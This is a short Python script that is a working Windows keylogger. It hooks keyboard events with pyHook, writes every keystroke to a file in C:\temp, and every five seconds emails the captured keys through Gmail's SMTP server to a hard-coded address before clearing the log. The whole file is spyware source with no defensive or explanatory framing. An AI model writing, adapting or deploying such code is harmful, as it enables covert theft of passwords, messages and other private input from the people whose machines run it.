import pyHook, pythoncom, sys, logging, time, datetime, ssl

dir_destination = 'C:\\temp\\key.txt'
stand_by = 5
timeout = time.time() + stand_by

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def Send_Email():
    with open(dir_destination, 'r+') as f:
        date = str(datetime.datetime.now())[:19]
        print(date)
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = f'Message: catch {date} - {data}'
        print(data)
        body = f
        Create_Email('usuario@gmail.com', 'Clave', 'usuariog@gmail.com', f'New Catch: {date}', data)
        f.seek(0)
        f.truncate()

def Create_Email(user, passw, recept, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recept
    Subject = subj
    Txt = body
    Email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
 
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:

            server.login(mailUser, mailPass)

            server.sendmail(From, To, Email)
            
        server.close()
        print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email, error: {e}")

def OnKeyboardEvent(event):
    logging.basicConfig(filename=dir_destination, level=logging.DEBUG, format='%(message)s')
    print('WindowsName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        Send_Email()
        timeout = time.time() + stand_by
    
    pythoncom.PumpWaitingMessages()
